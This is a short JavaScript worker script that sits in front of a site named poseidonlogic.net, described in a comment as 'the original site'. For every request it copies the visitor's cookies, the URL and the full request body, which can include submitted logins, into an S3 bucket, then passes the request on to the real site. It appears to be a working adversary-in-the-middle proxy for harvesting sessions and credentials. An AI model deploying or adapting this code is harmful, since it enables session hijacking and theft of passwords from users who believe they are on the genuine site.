import { AwsClient } from 'aws4fetch';

export default {
  async fetch(request, env, ctx) {
    // Capture request data
    const aws = new AwsClient({
      accessKeyId: env.AWS_KEY,
      secretAccessKey: env.AWS_SECRET_KEY,
      service: 's3',
      region: env.BUCKET_REGION,
    });

    const body = await request.text();
    const session = request.headers.get('Cookie') || 'no-session';
    const logData = `Session: ${session}\nURL: ${request.url}\nBody:\n${body}`;

    const now = new Date().toISOString();
    const key = `logs/${now}.txt`;
    const s3Url = `https://${env.BUCKET_NAME}.s3.${env.BUCKET_REGION}.amazonaws.com/${key}`;

    ctx.waitUntil(
      aws.fetch(s3Url, {
        method: 'PUT',
        headers: { 'Content-Type': 'text/plain' },
        body: logData,
      })
    );

    // Proxy the original request to your backend
    const url = new URL(request.url);
    url.hostname = "poseidonlogic.net"; // Point to the original site

    // Reconstruct request with same method/body/headers
    const proxyRequest = new Request(url.toString(), {
      method: request.method,
      headers: request.headers,
      body: request.method !== 'GET' && request.method !== 'HEAD' ? body : undefined,
      redirect: 'manual',
    });

    const response = await fetch(proxyRequest);
    return response;
  }
};
